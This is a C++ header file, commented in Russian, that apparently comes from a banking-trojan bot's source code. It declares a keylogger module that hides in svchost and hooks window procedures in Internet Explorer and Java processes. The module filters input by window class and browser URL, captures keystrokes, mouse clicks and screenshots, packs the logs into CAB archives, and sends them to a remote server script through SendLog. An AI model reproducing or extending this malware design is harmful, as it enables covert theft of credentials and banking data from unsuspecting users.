//---------------------------------------------------------------------------

#ifndef UniversalKeyLoggerH
#define UniversalKeyLoggerH

//---------------------------------------------------------------------------

#include <windows.h>
#include "BotClasses.h"
#include "WndUtils.h"


//*****************************************************************************
//
//  ВАЖНО!
//
//  Отправка данных кейлогера осуществляется из потока отправки данных
//  работающего в процессе svchost. Обработка файлов кейлогера осуществляется
//  только в случае подключенного модуля. По этому если используется кейлогер,
//  то этот модуль должен подключаться в заголовочном модуле который прямо или
//  косвенно подключается в Loader.cpp либо в Modules.h
//
//****************************************************************************




//---------------------------------------------------------------------------
//  DataLogger - Методы для логирования данных
//---------------------------------------------------------------------------

#define MAX_PARENTWND_LEVEL 10 /* Максимальный уровень вложенности окон при фильтрации */

#define DEFAULT_SCREENSHOT_WIDTH  50
#define DEFAULT_SCREENSHOT_HEIGHT 50


#define KEYLOGGER_DATA_APPLICATION 1       /* Имя приложения (системы) */
#define KEYLOGGER_DATA_TEXT        2       /* Данные , что вводил пользователь */
#define KEYLOGGER_DATA_IMAGEPNG    3       /* Картинка в PNG формате */
#define KEYLOGGER_DATA_FILE        4       /* Любой файл */
#define KEYLOGGER_DATA_NOOP        0xFFFF  /* Пустая команда. Введена на случай ели необходимо поддержать файл на диске без отправки  */


// Заранее известные процессы в которых будет работать кейлогер
#define PROCESS_UNKNOWN    0
#define PROCESS_IE         1
#define PROCESS_JAVA       2


// Хэши заранее известных процессов
#define PROCESS_HASH_IE     0x250DFA8F /* iexplore.exe */
#define PROCESS_HASH_JAVA   0x150CFBD3 /* java.exe */


// Максимальное количество действий после которых система
// кейлогера будет закрыта. Будет работать только в случае
// конда система кейлогера не будет содержать фильтры. т.е.
// будут логироваться весь ввод
#define MAX_ACTIONS_COUNT 100


// Максимальный интервал времени в течении которого будет ожидаться
// ввод пользователя. В случае если действий не было, то сессия будет
// закрыта
#define MAX_NON_ACTION_INTERVAL  300000 /*5 минут*/

// Структура логера данных
typedef struct TKeyLogger
{
	DWORD Process;           // Идентификатор процесса в котором работает кейлогер
	PCHAR ProcessName;       // Полное имя процесса
	DWORD ProcessNameHash;   // Хэш имени процесса (короткое имя в нижнем регистре)
	DWORD PID;               // Идентификатор процесса
	bool  Active;            // Признак активности кейлогера
	PCHAR FileName;   	     // Файл в который логируются данные
	PCHAR Buffer;            // Буфер логирования данных клавиатуры
	DWORD BufferSize;        // Размер буфера
	DWORD Position;          // Текущая позиция в буфере для записи
	HWND  ActiveWND;  	     // Активное окно за которым ведётся наблюдение
//	PList Filters;           // Фильтры окон
	DWORD ImageIndex;        // Индекс текущей картинки
	PList Events;            // Список обработчиков событий. Только для внутреннего использования!

    PList Systems;           // Зарегистрированные системы

	WNDPROCLIST WndProcList; // Список подменённых окнных процедур

} *PKeyLogger;


// Объявляем функции-события
typedef void (*PKLGNotifyEvent)(LPVOID Sender);


enum TKeyFilterWndMode
{
	kfwSelf,   // Проверять своё окно
	kfwParent, // Проверять родительское окно
	kfwAll     // Проверять все окна
};

enum TKeyFilterActions
{
	kfaKeyboard, // Обрабатывать сообщеня клавиатуры
	kfaMouse,    // Обрабатывать сообщения мыши
	kfaAll       // Обрабатывать все действия
};


//------------------------------------------------------
//  Константы для определения типа логируемых действий€
//------------------------------------------------------
#define LOG_KEYBOARD 1
#define LOG_MOUSE    2
#define LOG_ALL       LOG_KEYBOARD | LOG_MOUSE


//------------------------------------------------------
//  Режимы фильтрации окон
//------------------------------------------------------
#define FILTRATE_SELF_WND    1
#define FILTRATE_PARENT_WND  2
#define FILTRATE_ALL_WND     FILTRATE_SELF_WND |  FILTRATE_PARENT_WND


enum TKeyLoggerAction {klaKeyboard, klaMouse};


// Дополнительные настройки фильтра кейлогера
typedef struct TKeyLoggerFilterData
{
	bool  DontShowSSInStr;   // Отключить вставку информацию о скриншоте в буфер кейлогера
	DWORD SSWidth;           // Ширина снимка экрана
	DWORD SSHeight;          // Высота снимка экрана
	PCHAR URL;               // Адрес сайта загруженного в браузер при котором должен срабатывать фильтр
	DWORD CursorColor;       // Цвет точки отображающей позицию курсора
} *PKeyLoggerFilterData;




// Фильтр кейлогера
typedef struct TKeyLogSystem
{
	TKeyFilterWndMode WndMode;  // Режим обработки окон
	TKeyFilterActions Actions;  // Обрабатываемые действия
	PCHAR WndClassName;         // Класс окна
	PCHAR WndText; 				// Текст окна

	PCHAR Name;              // Имя фильтра(Приложения)
	DWORD ProcessNameHash;   // Хэш имени процесса для которого работает система (Короткое имя в нижнем регистре)
	PList Filters;           // Фильтры зарегистрированные для системы
	bool  MakeScreenShot;    // Создавать снимок всего экрана при инициализации
	bool  FiltersInORMode;   // Включает работу фильтров в режиме OR т.е. система
							 // Будет считаться отработавшей если  сработал
							 // хотябы один фильтр. В противном случае дожны сработать все фильтры
    PCHAR URL;               // Адрес на котором должна работать система

	PKLGNotifyEvent OnActivate;  // Событие активации системы

} *PKeyLogSystem;



// Оконный фильт
typedef struct TWndFilter
{
	DWORD Mode;          // Режим фильтрации окон
	DWORD Actions;       // Действия, которые необходимо обработать
	PCHAR ClassName;     //  Имя класса окна
	PCHAR Text;          //  Текст окна
	DWORD MaxParentLevel;// Максимальный уровень вложенности родительских окон
	bool  MakeScreenShot;// Создавать снимок всего экрана при инициализации
	PCHAR URL;           // Адрес на котором доступн фильтр
	bool  CaseSensetive; // Фильтр чувствителен к регистру
	DWORD Flags;         // Для внутреннего использования

    PKLGNotifyEvent OnActivate; // Событие срабатывания фильтра

	TKeyLoggerFilterData Data;	// Дополнительные данные. Зарезервировано
}*PWndFilter;


//****************************************************************************
// Типы и объявления событий кейлогера
//****************************************************************************

// Метод обработки событий кейлогера
typedef void (WINAPI *TKeyLoggerEventHandler)(PKeyLogger Logger,
											  DWORD EventID,
											  LPVOID Data);

/* KLE - Key Logger Event */
#define KLE_ACTIVATED      1 /* Кейлогер активирован */
#define KLE_IE_URL_CHANGED 2 /* Сменился активный адрес Интернет експлорера. Data = PCHAR, новый адрес */


//****************************************************************************
//  KeyLogger - методы для организации работы кейлогера и работы с ним
//****************************************************************************
namespace KeyLogger
{
	// Инициализировать кейлогер
	// Метод создаёт необходимые структуры и возвращает указатель на глобальный
	// кейлогер для более детальной настройки. Для запуска логирования
	// необходимо вызвать метод Start
	PKeyLogger Initialize(PCHAR AppName);

	// Запуск кейлогера
    bool Start();

	// Добавить строку в буфер
	void AddStrToBuffer(PCHAR Str, DWORD StrLen);

	// Добавить скриншот
	// Если AddToKeyLog то информация о снимке будет добавлена в буффер кейлога
	void AddScreenShot(bool AddToKeyLog, LPBYTE ScreenShot, DWORD Size);

	// Функция добавляет файл в архив кейлогера
	// FileName - реальное имя файла
	// Name - имя с которым директория будет добавлена в архив
    void AddFile(PCHAR FileName, PCHAR Name, LPVOID FileData, DWORD FileDataSize);

	// Функция добавляет директорию в архив кейлогера
	// Path - реальный путь к директории
	// Name - имя с которым директория будет добавлена в архив
    void AddDirectory(PCHAR Path, PCHAR Name);


	//----------------------------------------------------------------------
	//  AddSystem - Функция регистрирует новую систему кейлогера
	//
	//  Name - Имя системы. С этим именем данные будут отправлены на сервер
	//
	//  ProcessHash - Хэш имени процесса в котором должена работать система
	//                если указать нулевой хэш, то система будет запускаться
	//				  в каждом процессе.
	//
	//  Результат: В случае успеха функция вернёт указатель на
	//			   зарегистрированную систему
	//----------------------------------------------------------------------
    PKeyLogSystem AddSystem(PCHAR Name, DWORD ProcessHash);


	//----------------------------------------------------------------------
	//  AddFilter - Функция добавляет фильтр окна
	//
	//  System - Система для которой добавляется фильтр
	//
	//  WndClass - Имя класса окна
	//
	//  WndText -  Текст окна
	//
	//  Mode - Режим работы фильтра
	//			FILTRATE_SELF_WND, FILTRATE_PARENT_WND,  FILTRATE_ALL_WND
	//
	//  LogAction - Параметр указывающий какие действия логировать
	//		        	LOG_KEYBOARD, LOG_MOUSE, LOG_ALL
	//
	//  MaxPArentLevel - Максимальный уровень вложенности родительского окна
	//----------------------------------------------------------------------
	PWndFilter AddFilter(PKeyLogSystem System, PCHAR WndClass, PCHAR WndText,
						 DWORD Mode, DWORD LogAction, DWORD MaxPArentLevel);


	// Записать буфер введённых символов в файл
	void WriteBuffer();

	// Добавить порцию данных в файл
	bool WriteToFile(HWND Sender, PCHAR BlockName, DWORD DataType, LPVOID Data, DWORD DataSize);

	// Установить активное окно
	void SetActiveWnd(HWND Wnd);

	// Закрыть текущую сессию кейлогера
	// Записывает текущий буфер в файл и освобождает файл
	void CloseSession();

	// Запаковать файл логера в CAB архив
	// 	LogFileName - файл с данными кейлогера
	//  CabFileName - Результирующий CAB архив
	//  AppName - указатель на строку PCHAR. В случае успеха в строку
	//  		  будет записано имя системы для которой работал кейлогер
	bool PackLoggerFileToCAB(PCHAR LogFileName, PCHAR CabFileName, PCHAR *AppName);

	//----------------------------------------------------------------------
	// CanSendLoggerFile - Функция возвращает истину если файл готов к
	//                     отправке
	//----------------------------------------------------------------------
    bool CanSendLoggerFile(PCHAR FileName, bool *InvalidFile);

	//----------------------------------------------------------------------
	// FiltrateWnd - Фильтровать окно
	//----------------------------------------------------------------------
	bool FiltrateWnd(HWND Wnd, DWORD Action, DWORD WndLevel,
				     PKeyLogSystem *System, PWndFilter *Filter, HWND *ParentWND);


	// Подключить обработчик события кейлогера
	// EventID - идентификатор события для которого подключаем обработчик.
	//			 песли равен 0 то обработчик будет вызываться для всех событий
	// Handler - метод, обработчик события
	bool ConnectEventHandler(DWORD EventID, TKeyLoggerEventHandler Handler);

	// Отключить обработчик события
	// EventID - Идинтификатор события для которого необходимо отключить
	//           обработчик. Если равен 0 то обработчик будет отключен для
	//			 всех событий
	// Handler - отключаемый обработчик событий
	void DisconnectEventHandler(DWORD EventID, TKeyLoggerEventHandler Handler);


	//---------------------------------------------------------------------
	//  GetCurrentURL - Функция возвращает адрес страницы открытой в данный
	//				    момент в браузере
	//  ВАЖНО: Функция НЕ создаёт строку, по этому уничтожать результат
	//         после работы ЗАПРЕЩЕНО
	//---------------------------------------------------------------------
	PCHAR GetCurrentURL();

	//---------------------------------------------------------------------
	//  SendLog - Функция отправляет отчт на сервер
	//
	//  URL - Адрес скипта. В случае пустого значения используется
	//        стандартный адрес скрипта
	//  AppHash - Хэш приложения
	//  Pid - Идентификатор процесса
	//  Log - Отправляемые данные
	//  LogLen -
	//---------------------------------------------------------------------
	bool SendLog(PCHAR URL, DWORD AppHash, DWORD Pid, PCHAR Log, DWORD LogLen);

}

PCHAR GetURLFromJavaProcess();




//---------------------------------------------------------------------------
#endif
